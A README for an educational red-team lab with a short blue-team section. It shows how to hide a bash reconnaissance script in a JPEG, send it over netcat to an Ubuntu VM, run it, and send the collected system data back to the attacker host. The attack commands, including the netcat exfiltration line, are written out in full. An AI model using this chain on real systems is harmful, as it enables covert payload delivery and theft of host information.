# 🔐 Red Team Lab — Recon Via Steganography

> A hands-on cybersecurity lab demonstrating reconnaissance, steganography, and file transfer techniques using Kali Linux and Ubuntu virtual machines.

---

## 📋 Table of Contents

- [Overview](#overview)
- [Lab Environment](#lab-environment)
- [Tools Used](#tools-used)
- [Phase 1 — Setup On Kali](#phase-1--setup-on-kali)
- [Phase 2 — Network Configuration](#phase-2--network-configuration)
- [Phase 3 — Transfer File To Ubuntu](#phase-3--transfer-file-to-ubuntu)
- [Phase 4 — Extract And Run Script On Ubuntu](#phase-4--extract-and-run-script-on-ubuntu)
- [Phase 5 — Send Results Back To Kali](#phase-5--send-results-back-to-kali)
- [Phase 6 — Blue Team Detection](#phase-6--blue-team-detection)
- [Lessons Learned](#lessons-learned)
- [Disclaimer](#disclaimer)

---

## Overview

This lab demonstrates a full red team exercise inside a safe virtual machine environment. The goal is to:

1. Write a reconnaissance script on Kali Linux
2. Hide the script inside a JPEG image using steganography
3. Transfer the hidden image to an Ubuntu target using Netcat
4. Extract and run the script on Ubuntu
5. Send the recon results back to Kali
6. Switch to blue team and detect the attack

This is purely for **educational purposes** inside an isolated virtual machine lab.

---

## Lab Environment

```
┌─────────────────────────────────────────┐
│           VirtualBox / VMware           │
│                                         │
│  ┌──────────────┐    ┌───────────────┐  │
│  │  Kali Linux  │    │    Ubuntu     │  │
│  │  (Attacker)  │◄──►│   (Target)   │  │
│  │192.168.1.133 │    │192.168.1.142  │  │
│  └──────────────┘    └───────────────┘  │
│                                         │
│         Bridged Network Adapter         │
└─────────────────────────────────────────┘
```

| Machine | Role | IP Address |
|---|---|---|
| Kali Linux | Attacker | 192.168.1.133 |
| Ubuntu | Target | 192.168.1.142 |

> **Important:** Both VMs must be set to **Bridged Adapter** in VirtualBox network settings.

---

## Tools Used

| Tool | Purpose |
|---|---|
| **Bash** | Writing the recon script |
| **cat** | Hiding script inside image (steganography) |
| **Netcat (nc)** | Transferring files between machines |
| **tail** | Extracting hidden script from image |
| **UFW** | Managing Ubuntu firewall rules |
| **ss / ip** | Network reconnaissance commands |

---

## Phase 1 — Setup On Kali

### Step 1 — Create Lab Folder

```bash
mkdir ~/lab
cd ~/lab
```

### Step 2 — Create Recon Script

```bash
nano recon.sh
```

Paste the following script:

```bash
#!/bin/bash
OUTPUT="recon_results.txt"
echo "===== RECON REPORT: $(date) =====" > $OUTPUT

echo -e "\n[+] Hostname & OS" >> $OUTPUT
hostname >> $OUTPUT
uname -a >> $OUTPUT
cat /etc/os-release >> $OUTPUT

echo -e "\n[+] Current User & Groups" >> $OUTPUT
whoami >> $OUTPUT
id >> $OUTPUT
groups >> $OUTPUT

echo -e "\n[+] Network Interfaces" >> $OUTPUT
ip addr show >> $OUTPUT

echo -e "\n[+] Open Ports" >> $OUTPUT
ss -tulnp >> $OUTPUT

echo -e "\n[+] Active Connections" >> $OUTPUT
ss -tnp >> $OUTPUT

echo -e "\n[+] Running Processes" >> $OUTPUT
ps aux >> $OUTPUT

echo -e "\n[+] Logged In Users" >> $OUTPUT
who >> $OUTPUT
last | head -20 >> $OUTPUT

echo -e "\n[+] Sudo Privileges" >> $OUTPUT
sudo -l 2>/dev/null >> $OUTPUT

echo -e "\n[+] Cron Jobs" >> $OUTPUT
crontab -l 2>/dev/null >> $OUTPUT
cat /etc/crontab >> $OUTPUT

echo -e "\n[+] Firewall Rules" >> $OUTPUT
iptables -L 2>/dev/null >> $OUTPUT

echo "[*] Recon Complete. Results saved to $OUTPUT"
```

Save with **Ctrl+O** then exit with **Ctrl+X**

### Step 3 — Make Script Executable

```bash
chmod +x recon.sh
```

### Step 4 — Copy Image Into Lab Folder

```bash
cp /home/sma9t/Downloads/russia.jpg /home/sma9t/lab/cover.jpg
```

### Step 5 — Verify Image Is Proper JPEG

```bash
file /home/sma9t/lab/cover.jpg
```

Expected output:
```
cover.jpg: JPEG image data
```

### Step 6 — Hide Script Inside Image

```bash
cat /home/sma9t/lab/cover.jpg /home/sma9t/lab/recon.sh > /home/sma9t/lab/hidden.jpg
```

### Step 7 — Note The Cover Image Size

```bash
wc -c /home/sma9t/lab/cover.jpg
```

> **Write down this number! You will need it later to extract the script on Ubuntu.**

### Step 8 — Verify Hidden File Was Created

```bash
ls -lh /home/sma9t/lab/
```

![Lab folder setup showing all files](screenshots/screenshot1-lab-setup.png)

> Hidden.jpg should be slightly larger than cover.jpg because it contains the hidden script.

---

### Steganography Proof — Cover vs Hidden File Size

```bash
wc -c /home/sma9t/lab/cover.jpg && wc -c /home/sma9t/lab/hidden.jpg
```

![Hidden file size comparison](screenshots/screenshot2-hidden-file.png)

---

## Phase 2 — Network Configuration

### Step 9 — Check Both Machine IPs

```bash
# On Kali
ip addr show | grep inet

# On Ubuntu
ip addr show | grep inet
```

### Step 10 — Test Connection From Kali To Ubuntu

```bash
ping -c 4 192.168.1.142
```

![Ping test showing successful connection](screenshots/screenshot3-ping-test.png)

### Step 11 — Allow Ports On Ubuntu Firewall

```bash
sudo ufw allow 4444
sudo ufw allow 5555
sudo ufw reload
sudo ufw status
```

---

## Phase 3 — Transfer File To Ubuntu

> **Golden Rule:** Ubuntu must be listening FIRST before Kali sends.

### Step 12 — ON UBUNTU FIRST — Start Listening

```bash
nc -lvnp 4444 > received.jpg
```

![Netcat listening on Ubuntu](screenshots/screenshot4-netcat-listening.png)

### Step 13 — ON KALI SECOND — Send Hidden Image

```bash
nc 192.168.1.142 4444 < /home/sma9t/lab/hidden.jpg
```

### Step 14 — Verify Transfer Was Successful

```bash
# On Ubuntu
wc -c received.jpg

# On Kali
wc -c /home/sma9t/lab/hidden.jpg
```

![File received successfully on Ubuntu](screenshots/screenshot5-file-received.png)

> Both numbers must match exactly.

---

## Phase 4 — Extract And Run Script On Ubuntu

### Step 15 — Extract The Hidden Script

```bash
# Replace 109874 with your actual number (cover.jpg size + 1)
tail -c +109874 received.jpg > recon.sh
```

### Step 16 — Verify Extraction Worked

```bash
cat recon.sh
```

![Script successfully extracted from image](screenshots/screenshot6-script-extracted.png)

### Step 17 — Make Script Executable And Run It

```bash
chmod +x recon.sh
./recon.sh
```

![Recon script running on Ubuntu](screenshots/screenshot7-script-running.png)

### Step 18 — Check Results File

```bash
cat recon_results.txt
```

![Recon results on Ubuntu](screenshots/screenshot8-recon-results.png)

---

## Phase 5 — Send Results Back To Kali

> **Golden Rule:** Kali must be listening FIRST before Ubuntu sends.

### Step 19 — ON KALI FIRST — Start Listening

```bash
nc -lvnp 5555 > /home/sma9t/lab/recon_results.txt
```

### Step 20 — ON UBUNTU SECOND — Send Results

```bash
nc 192.168.1.133 5555 < recon_results.txt
```

### Step 21 — ON KALI — Read The Results

```bash
cat /home/sma9t/lab/recon_results.txt
```

![Recon results successfully received on Kali](screenshots/screenshot9-results-on-kali.png)

---

## Phase 6 — Blue Team Detection

Switch roles and practice detecting what just happened on Ubuntu.

### Check Command History

```bash
history
```

![Blue team detection showing suspicious commands](screenshots/screenshot10-blue-team.png)

### What To Look For

```
nc -lvnp 4444          ← Port was opened to receive file
tail -c +109874        ← Hidden script was extracted
chmod +x recon.sh      ← Script was made executable
./recon.sh             ← Script was executed
nc 192.168.1.133 5555  ← Data was sent out
```

### Other Detection Commands

```bash
# Check recently created files
find ~/ -mmin -60 -type f 2>/dev/null

# Check network connections
ss -tulnp

# Check who connected
last

# Check for suspicious files
ls -lht ~/
```

---

## Full Visual Flow

```
KALI (Attacker)                        UBUNTU (Target)
───────────────                        ───────────────
Create recon.sh
Hide in cover.jpg using cat
         │
         │ ──── netcat transfer ────►  Receive hidden.jpg
         │                            Extract recon.sh
         │                            Run recon.sh
         │                            Create recon_results.txt
         │                                     │
         │ ◄─── netcat transfer ───────────────┘
Read recon_results.txt
```

---

## Common Errors And Fixes

| Error | Cause | Fix |
|---|---|---|
| Connection refused | Ubuntu not listening yet | Start Ubuntu nc first |
| Connection timed out | Firewall blocking port | Run sudo ufw allow 4444 |
| File size is 0 | Transfer failed | Redo transfer carefully |
| Permission denied | Wrong directory | Save to /home/sma9t/lab/ |
| No such file or directory | Wrong path | Use full path /home/sma9t/lab/ |
| event not found | Double quotes with ! | Use single quotes instead |

---

## Lessons Learned

### Red Team Lessons

| Skill | What Was Learned |
|---|---|
| Recon | How to gather system information silently |
| Steganography | How to hide files inside images |
| Netcat | How to transfer files between machines |
| Firewall Evasion | How open ports allow connections |

### Blue Team Lessons

| Detection Method | What It Reveals |
|---|---|
| Check history | Commands run by attacker |
| Check new files | Scripts dropped on system |
| Check network | Connections made in and out |
| Check last | Who connected and when |

---

## Disclaimer

> This lab is strictly for **educational purposes** inside an isolated virtual machine environment. All techniques demonstrated here should only be practiced on systems you own or have explicit permission to test. Unauthorized use of these techniques against real systems is illegal and unethical.

---

## Author

**sma9t**
- Platform: TryHackMe / HackTheBox
- Tools: Kali Linux, Ubuntu, VirtualBox

---

*Happy Hacking — Stay Ethical* 🔐
